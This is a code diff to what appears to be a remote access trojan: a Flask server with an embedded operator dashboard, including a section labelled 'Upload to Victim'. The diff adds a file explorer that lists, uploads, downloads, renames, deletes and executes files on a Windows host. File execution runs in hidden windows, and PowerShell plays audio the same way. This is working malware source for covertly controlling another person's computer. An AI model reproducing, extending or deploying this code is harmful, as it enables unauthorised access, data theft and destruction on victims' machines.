@@ -2053,23 +2053,59 @@ DASHBOARD_HTML = r'''
         .fullscreen-btn:hover { border-color: #7c3aed; }
 
         /* File Browser */
-        .file-path-bar { display: flex; gap: 8px; margin-bottom: 14px; }
+        .file-path-bar { display: flex; gap: 8px; margin-bottom: 10px; }
         .file-path-bar input { flex: 1; }
+        .file-breadcrumb { display: flex; gap: 2px; margin-bottom: 8px; flex-wrap: wrap; align-items: center; font-size: 12px; }
+        .file-breadcrumb span { color: #7c3aed; cursor: pointer; padding: 2px 6px; border-radius: 3px; }
+        .file-breadcrumb span:hover { background: rgba(124, 58, 237, 0.15); }
+        .file-breadcrumb .sep { color: #555; cursor: default; padding: 0 1px; }
+        .file-breadcrumb .sep:hover { background: none; }
+        .file-toolbar { display: flex; gap: 6px; margin-bottom: 10px; flex-wrap: wrap; }
+        .file-toolbar .btn { font-size: 11px; padding: 4px 10px; }
         .file-list {
             background: #050508;
             border: 1px solid rgba(124, 58, 237, 0.1);
-            border-radius: 6px; flex: 1; overflow-y: auto;
+            border-radius: 6px; overflow-y: auto;
+        }
+        .file-header {
+            display: grid; grid-template-columns: 1fr 90px 130px 60px;
+            padding: 8px 14px; font-size: 11px; color: #666;
+            border-bottom: 1px solid rgba(124, 58, 237, 0.15);
+            font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px;
         }
         .file-item {
-            padding: 10px 14px;
-            border-bottom: 1px solid rgba(124, 58, 237, 0.08);
-            cursor: pointer; display: flex;
-            align-items: center; gap: 10px;
+            display: grid; grid-template-columns: 1fr 90px 130px 60px;
+            padding: 8px 14px;
+            border-bottom: 1px solid rgba(124, 58, 237, 0.05);
+            cursor: pointer; align-items: center;
             font-size: 13px;
         }
         .file-item:hover { background: rgba(124, 58, 237, 0.06); }
+        .file-item.selected { background: rgba(124, 58, 237, 0.12); }
         .file-item:last-child { border-bottom: none; }
-        .file-icon { color: #7c3aed; font-weight: bold; }
+        .file-name { display: flex; align-items: center; gap: 8px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+        .file-icon { font-size: 14px; flex-shrink: 0; }
+        .file-icon.dir { color: #fbbf24; }
+        .file-icon.file { color: #7c3aed; }
+        .file-icon.exe { color: #ef4444; }
+        .file-icon.img { color: #22c55e; }
+        .file-icon.audio { color: #3b82f6; }
+        .file-icon.video { color: #f97316; }
+        .file-icon.archive { color: #a855f7; }
+        .file-size, .file-mtime, .file-actions { font-size: 11px; color: #888; }
+        .file-actions { display: flex; gap: 4px; }
+        .file-actions button { background: none; border: none; color: #7c3aed; cursor: pointer; font-size: 11px; padding: 2px 4px; border-radius: 3px; }
+        .file-actions button:hover { background: rgba(124, 58, 237, 0.15); }
+        .file-actions button.del { color: #ef4444; }
+        .file-ctx {
+            position: fixed; background: #111; border: 1px solid rgba(124,58,237,0.3);
+            border-radius: 6px; padding: 4px 0; z-index: 9999; min-width: 160px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.5); display: none;
+        }
+        .file-ctx button { display: block; width: 100%; text-align: left; background: none; border: none; color: #ddd; padding: 8px 14px; font-size: 12px; cursor: pointer; }
+        .file-ctx button:hover { background: rgba(124,58,237,0.15); }
+        .file-ctx button.danger { color: #ef4444; }
+        .file-ctx .divider { height: 1px; background: rgba(124,58,237,0.15); margin: 4px 0; }
 
         /* Animations */
         @keyframes pulse {
@@ -2427,9 +2463,29 @@ DASHBOARD_HTML = r'''
             <!-- Files Page -->
             <div class="page" id="page-files">
                 <div class="section">
-                    <div class="section-header"><div class="section-title">File Browser</div><div><button class="btn small" onclick="downloadFile()">Download</button><button class="btn small" onclick="document.getElementById('fileInput').click()">Upload</button><input type="file" id="fileInput" style="display:none;" onchange="uploadFile()"></div></div>
-                    <div class="file-path-bar"><input type="text" id="filePath" placeholder="Path (e.g., C:\Users\...)"><button class="btn" onclick="listFiles()">Browse</button></div>
-                    <div class="file-list" id="fileList"></div>
+                    <div class="section-header"><div class="section-title">File Explorer</div></div>
+                    <div class="file-path-bar"><input type="text" id="filePath" placeholder="Path (e.g., C:\Users\...)" onkeydown="if(event.key==='Enter')listFiles()"><button class="btn" onclick="listFiles()">Go</button></div>
+                    <div class="file-breadcrumb" id="fileBreadcrumb"></div>
+                    <div class="file-toolbar">
+                        <button class="btn" onclick="fileGoUp()">&#x2191; Up</button>
+                        <button class="btn" onclick="fileRefresh()">&#x21bb; Refresh</button>
+                        <button class="btn" onclick="fileNewFolder()">+ Folder</button>
+                        <button class="btn" onclick="document.getElementById('fileInput').click()">&#x2b06; Upload</button>
+                        <input type="file" id="fileInput" style="display:none;" onchange="uploadFile()">
+                    </div>
+                    <div class="file-list" id="fileList">
+                        <div class="file-header"><div>Name</div><div>Size</div><div>Modified</div><div></div></div>
+                    </div>
+                </div>
+                <div class="file-ctx" id="fileCtx">
+                    <button onclick="fileCtxOpen()">Open</button>
+                    <button onclick="fileCtxDownload()">Download</button>
+                    <button onclick="fileCtxExec()">Execute</button>
+                    <div class="divider"></div>
+                    <button onclick="fileCtxRename()">Rename</button>
+                    <button onclick="fileCtxNewFolder()">New Folder</button>
+                    <div class="divider"></div>
+                    <button class="danger" onclick="fileCtxDelete()">Delete</button>
                 </div>
                 <div class="section">
                     <div class="section-header"><div class="section-title">Upload to Victim</div></div>
@@ -3103,34 +3159,163 @@ DASHBOARD_HTML = r'''
         }
 
         // Files
-        async function listFiles() {
-            const path = document.getElementById('filePath').value || 'C:\\\\';
+        let _fileCurrentPath = 'C:\\';
+        let _fileCtxPath = '';
+        let _fileCtxIsDir = false;
+
+        function _fileIcon(name, isDir) {
+            if (isDir) return '<span class="file-icon dir">&#x1f4c1;</span>';
+            const ext = name.split('.').pop().toLowerCase();
+            if (['exe','msi','bat','cmd','ps1','vbs'].includes(ext)) return '<span class="file-icon exe">&#x26a0;</span>';
+            if (['jpg','jpeg','png','gif','bmp','webp','ico','svg'].includes(ext)) return '<span class="file-icon img">&#x1f5bc;</span>';
+            if (['mp3','wav','ogg','flac','aac','m4a','wma'].includes(ext)) return '<span class="file-icon audio">&#x1f3b5;</span>';
+            if (['mp4','avi','mkv','mov','wmv','webm'].includes(ext)) return '<span class="file-icon video">&#x1f3ac;</span>';
+            if (['zip','rar','7z','tar','gz'].includes(ext)) return '<span class="file-icon archive">&#x1f4e6;</span>';
+            return '<span class="file-icon file">&#x1f4c4;</span>';
+        }
+        function _formatSize(bytes) {
+            if (bytes === 0) return '-';
+            if (bytes < 1024) return bytes + ' B';
+            if (bytes < 1048576) return (bytes/1024).toFixed(1) + ' KB';
+            if (bytes < 1073741824) return (bytes/1048576).toFixed(1) + ' MB';
+            return (bytes/1073741824).toFixed(2) + ' GB';
+        }
+        function _buildBreadcrumbs(path) {
+            const bc = document.getElementById('fileBreadcrumb');
+            bc.innerHTML = '';
+            if (!path) return;
+            const clean = path.replace(/\\+$/, '');
+            const parts = clean.split('\\');
+            let accumulated = '';
+            parts.forEach((part, i) => {
+                if (!part && i === 0) { accumulated = '\\'; return; }
+                if (!part) return;
+                accumulated += part + '\\';
+                const navPath = accumulated;
+                const span = document.createElement('span');
+                span.textContent = part || '\\';
+                span.onclick = () => { document.getElementById('filePath').value = navPath; listFiles(navPath); };
+                bc.appendChild(span);
+                if (i < parts.length - 1) {
+                    const sep = document.createElement('span');
+                    sep.className = 'sep';
+                    sep.textContent = ' \\ ';
+                    bc.appendChild(sep);
+                }
+            });
+        }
+        async function listFiles(navPath) {
+            const path = navPath || document.getElementById('filePath').value || 'C:\\';
+            document.getElementById('filePath').value = path;
+            _fileCurrentPath = path;
             const res = await fetch('/api/files/list', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({path})});
             const data = await res.json();
+            _buildBreadcrumbs(data.path || path);
             const list = document.getElementById('fileList');
-            list.innerHTML = '';
-            (data.files || []).forEach(file => {
+            list.innerHTML = '<div class="file-header"><div>Name</div><div>Size</div><div>Modified</div><div></div></div>';
+            if (data.error) {
+                const err = document.createElement('div');
+                err.className = 'file-item';
+                err.innerHTML = '<div class="file-name" style="color:#ef4444;">' + data.error + '</div>';
+                list.appendChild(err);
+                return;
+            }
+            (data.files || []).forEach(f => {
                 const item = document.createElement('div');
                 item.className = 'file-item';
-                const isDir = file.endsWith('/') || file.endsWith('\\');
-                const isImage = /\.(jpg|jpeg|png|gif|bmp|webp|ico|svg)$/i.test(file);
-                if (isImage) {
-                    item.classList.add('is-image');
-                    const fullPath = path.endsWith('\\') ? path + file : path + '\\' + file;
-                    item.innerHTML = `<img class="file-thumb" src="/api/files/preview?path=${encodeURIComponent(fullPath)}" onerror="this.style.display='none';this.nextElementSibling.style.display='inline';"><span class="file-icon" style="display:none;">[F]</span>${file}`;
-                } else {
-                    item.innerHTML = `<span class="file-icon">${isDir ? '[D]' : '[F]'}</span>${file}`;
-                }
-                item.onclick = () => { document.getElementById('filePath').value = path.endsWith('\\') ? path + file : path + '\\' + file; };
+                const full = (path.endsWith('\\') ? path : path + '\\') + f.name;
+                item.innerHTML = `
+                    <div class="file-name">${_fileIcon(f.name, f.is_dir)} ${f.is_dir ? '<strong>' + f.name + '</strong>' : f.name}</div>
+                    <div class="file-size">${f.is_dir ? '' : _formatSize(f.size)}</div>
+                    <div class="file-mtime">${f.mtime || ''}</div>
+                    <div class="file-actions">
+                        ${!f.is_dir ? '<button onclick="event.stopPropagation();fileDownloadOne(\'' + full.replace(/'/g,"\\\\'") + '\')" title="Download">&#x2b07;</button>' : ''}
+                        ${!f.is_dir && /\.(exe|msi|bat|cmd|ps1)$/i.test(f.name) ? '<button onclick="event.stopPropagation();fileExecOne(\'' + full.replace(/'/g,"\\\\'") + '\')" title="Execute">&#x25b6;</button>' : ''}
+                        <button onclick="event.stopPropagation();fileDeleteOne(\'' + full.replace(/'/g,"\\\\'") + '\',\'' + f.name.replace(/'/g,"\\\\'") + '\')" class="del" title="Delete">&#x2716;</button>
+                    </div>`;
+                item.onclick = () => {
+                    if (f.is_dir) {
+                        document.getElementById('filePath').value = full;
+                        listFiles(full);
+                    } else {
+                        document.querySelectorAll('.file-item.selected').forEach(el => el.classList.remove('selected'));
+                        item.classList.add('selected');
+                    }
+                };
+                item.oncontextmenu = (e) => {
+                    e.preventDefault();
+                    _fileCtxPath = full;
+                    _fileCtxIsDir = f.is_dir;
+                    const ctx = document.getElementById('fileCtx');
+                    ctx.style.display = 'block';
+                    ctx.style.left = Math.min(e.clientX, window.innerWidth - 180) + 'px';
+                    ctx.style.top = Math.min(e.clientY, window.innerHeight - 200) + 'px';
+                };
                 list.appendChild(item);
             });
-            logActivity('Listed files');
+            logActivity('Listed: ' + path);
         }
-        function downloadFile() {
-            const path = document.getElementById('filePath').value;
-            window.location.href = `/api/files/download?path=${encodeURIComponent(path)}`;
-            logActivity('Downloading file');
+        function fileGoUp() {
+            const parent = _fileCurrentPath.replace(/\\+$/, '').split('\\').slice(0, -1).join('\\');
+            if (parent.length <= 2) { listFiles(parent + '\\'); return; }
+            if (parent) { document.getElementById('filePath').value = parent + '\\'; listFiles(parent + '\\'); }
         }
+        function fileRefresh() { listFiles(_fileCurrentPath); }
+        async function fileNewFolder() {
+            const name = prompt('Folder name:');
+            if (!name) return;
+            const newPath = (_fileCurrentPath.endsWith('\\') ? _fileCurrentPath : _fileCurrentPath + '\\') + name;
+            await fetch('/api/files/mkdir', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({path: newPath})});
+            logActivity('Created folder: ' + name, 'success');
+            fileRefresh();
+        }
+        function fileDownloadOne(path) {
+            window.location.href = '/api/files/download?path=' + encodeURIComponent(path);
+            logActivity('Downloading: ' + path.split('\\').pop());
+        }
+        async function fileExecOne(path) {
+            await fetch('/api/files/exec', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({path})});
+            logActivity('Executed: ' + path.split('\\').pop(), 'success');
+        }
+        async function fileDeleteOne(path, name) {
+            if (!confirm('Delete ' + name + '?')) return;
+            await fetch('/api/files/delete', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({path})});
+            logActivity('Deleted: ' + name, 'warn');
+            fileRefresh();
+        }
+        function fileCtxOpen() {
+            document.getElementById('fileCtx').style.display = 'none';
+            if (_fileCtxIsDir) { document.getElementById('filePath').value = _fileCtxPath; listFiles(_fileCtxPath); }
+        }
+        function fileCtxDownload() {
+            document.getElementById('fileCtx').style.display = 'none';
+            if (!_fileCtxIsDir) fileDownloadOne(_fileCtxPath);
+        }
+        function fileCtxExec() {
+            document.getElementById('fileCtx').style.display = 'none';
+            if (!_fileCtxIsDir) fileExecOne(_fileCtxPath);
+        }
+        function fileCtxRename() {
+            document.getElementById('fileCtx').style.display = 'none';
+            const oldName = _fileCtxPath.split('\\').pop();
+            const newName = prompt('Rename to:', oldName);
+            if (!newName || newName === oldName) return;
+            const dir = _fileCtxPath.substring(0, _fileCtxPath.lastIndexOf('\\'));
+            fetch('/api/files/rename', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({old_path: _fileCtxPath, new_path: dir + '\\' + newName})}).then(() => {
+                logActivity('Renamed: ' + oldName + ' -> ' + newName, 'success');
+                fileRefresh();
+            });
+        }
+        function fileCtxNewFolder() {
+            document.getElementById('fileCtx').style.display = 'none';
+            fileNewFolder();
+        }
+        function fileCtxDelete() {
+            document.getElementById('fileCtx').style.display = 'none';
+            const name = _fileCtxPath.split('\\').pop();
+            fileDeleteOne(_fileCtxPath, name);
+        }
+        document.addEventListener('click', () => { document.getElementById('fileCtx').style.display = 'none'; });
         async function uploadFile() {
             const file = document.getElementById('fileInput').files[0];
             if (!file) return;
@@ -3140,6 +3325,7 @@ DASHBOARD_HTML = r'''
             if (path) formData.append('path', path);
             await fetch('/api/files/upload', {method: 'POST', body: formData});
             logActivity('Uploaded: ' + file.name, 'success');
+            fileRefresh();
         }
         async function uploadToVictim() {
             const file = document.getElementById('uploadFileInput').files[0];
@@ -3743,20 +3929,28 @@ def play_audio():
             f.write(audio_data)
         def _play_and_cleanup(path):
             try:
-                subprocess.run(['powershell', '-Command',
-                    f'$player = New-Object System.Windows.Media.MediaPlayer; $player.Open("{path}"); Start-Sleep -Milliseconds 500; $player.Play(); Start-Sleep -Seconds 60; $player.Close()'],
-                    capture_output=True, timeout=120, creationflags=0x08000000)
-            except:
-                try:
-                    subprocess.run(['powershell', '-Command',
-                        f'(New-Object Media.SoundPlayer "{path}").PlaySync()'],
-                        capture_output=True, timeout=60, creationflags=0x08000000)
-                except:
+                ext = os.path.splitext(path)[1].lower()
+                if ext in ('.mp3', '.m4a', '.wma', '.aac', '.ogg', '.flac'):
+                    ps_script = (
+                        f'$wmp = New-Object -ComObject WMPlayer.OCX; '
+                        f'$wmp.URL = "{path}"; '
+                        f'$wmp.controls.play(); '
+                        f'Start-Sleep -Seconds 300; '
+                        f'$wmp.controls.stop(); '
+                        f'$wmp.close()'
+                    )
+                    subprocess.run(['powershell', '-Command', ps_script],
+                        capture_output=True, timeout=310, creationflags=0x08000000)
+                else:
                     try:
+                        subprocess.run(['powershell', '-Command',
+                            f'(New-Object Media.SoundPlayer "{path}").PlaySync()'],
+                            capture_output=True, timeout=120, creationflags=0x08000000)
+                    except:
                         import winsound
                         winsound.PlaySound(path, winsound.SND_FILENAME)
-                    except:
-                        pass
+            except:
+                pass
             try:
                 os.remove(path)
             except:
@@ -4442,16 +4636,95 @@ def system_info():
 
 @app.route('/api/files/list', methods=['POST'])
 def list_files():
-    """List files in directory."""
+    """List files in directory with details."""
     try:
         data = request.get_json()
         path = data.get('path', 'C:\\')
-        if os.path.exists(path):
-            files = os.listdir(path)
-            return jsonify({'files': files})
-        return jsonify({'files': []})
+        if not os.path.exists(path):
+            return jsonify({'files': [], 'path': path, 'parent': ''})
+        parent = os.path.dirname(path.rstrip('\\')) if len(path.rstrip('\\')) > 3 else ''
+        entries = []
+        try:
+            for name in os.listdir(path):
+                full = os.path.join(path, name)
+                is_dir = os.path.isdir(full)
+                size = 0
+                mtime = ''
+                if not is_dir:
+                    try:
+                        size = os.path.getsize(full)
+                    except:
+                        pass
+                try:
+                    mtime = datetime.fromtimestamp(os.path.getmtime(full)).strftime('%Y-%m-%d %H:%M')
+                except:
+                    pass
+                entries.append({'name': name, 'is_dir': is_dir, 'size': size, 'mtime': mtime})
+            entries.sort(key=lambda e: (not e['is_dir'], e['name'].lower()))
+        except PermissionError:
+            return jsonify({'files': [], 'path': path, 'parent': parent, 'error': 'Access denied'})
+        return jsonify({'files': entries, 'path': path, 'parent': parent})
     except:
-        return jsonify({'files': []})
+        return jsonify({'files': [], 'path': '', 'parent': ''})
+
+@app.route('/api/files/mkdir', methods=['POST'])
+def files_mkdir():
+    """Create a new directory."""
+    try:
+        data = request.get_json()
+        path = data.get('path', '')
+        if not path:
+            return jsonify({'success': False, 'error': 'No path'})
+        os.makedirs(path, exist_ok=True)
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/files/delete', methods=['POST'])
+def files_delete():
+    """Delete a file or directory."""
+    try:
+        data = request.get_json()
+        path = data.get('path', '')
+        if not path:
+            return jsonify({'success': False, 'error': 'No path'})
+        if os.path.isfile(path):
+            os.remove(path)
+        elif os.path.isdir(path):
+            import shutil
+            shutil.rmtree(path, ignore_errors=True)
+        else:
+            return jsonify({'success': False, 'error': 'Not found'})
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/files/rename', methods=['POST'])
+def files_rename():
+    """Rename or move a file/directory."""
+    try:
+        data = request.get_json()
+        old_path = data.get('old_path', '')
+        new_path = data.get('new_path', '')
+        if not old_path or not new_path:
+            return jsonify({'success': False, 'error': 'Missing paths'})
+        os.rename(old_path, new_path)
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/files/exec', methods=['POST'])
+def files_exec():
+    """Execute a file on the host."""
+    try:
+        data = request.get_json()
+        path = data.get('path', '')
+        if not path or not os.path.isfile(path):
+            return jsonify({'success': False, 'error': 'Invalid file'})
+        subprocess.Popen([path], creationflags=0x08000000, close_fds=True)
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/files/preview')
 def preview_file():
